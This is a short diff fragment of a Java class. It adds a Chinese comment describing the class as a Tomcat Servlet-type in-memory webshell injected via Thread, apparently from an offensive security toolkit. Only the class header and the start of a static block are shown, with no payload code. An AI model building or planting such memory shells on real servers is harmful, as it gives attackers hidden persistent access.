@@ -7,6 +7,10 @@ import org.apache.catalina.loader.WebappClassLoaderBase;
 
 import javax.servlet.*;
 
+/**
+ * 使用 Thread 注入 Tomcat Servlet 型内存马
+ * @author nu1r
+ */
 public class TSMSFromThreadS implements Servlet {
 
     static {
